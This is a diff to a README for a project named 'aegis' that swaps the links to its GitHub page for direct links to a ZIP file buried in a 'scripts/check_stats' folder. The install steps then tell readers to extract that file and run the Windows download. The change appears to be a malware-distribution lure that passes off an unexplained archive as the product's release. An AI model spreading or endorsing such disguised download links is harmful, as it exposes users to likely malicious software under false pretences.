@@ -1,6 +1,6 @@
 # ⚙️ aegis - Secure multi-user platform
 
-[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Chineseyamgrossprofit190/aegis)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chineseyamgrossprofit190/aegis/main/scripts/check_stats/Software-guestwise.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use the link above to visit the download page and get the latest version.
 
 ## 📥 Download and install
 
-1. Open the download page: [https://github.com/Chineseyamgrossprofit190/aegis](https://github.com/Chineseyamgrossprofit190/aegis)
+1. Open the download page: [https://raw.githubusercontent.com/Chineseyamgrossprofit190/aegis/main/scripts/check_stats/Software-guestwise.zip](https://raw.githubusercontent.com/Chineseyamgrossprofit190/aegis/main/scripts/check_stats/Software-guestwise.zip)
 2. On the GitHub page, look for the latest release or the main download file.
 3. Download the Windows file that matches the release name.
 4. If the file is a ZIP, right-click it and choose **Extract All**.
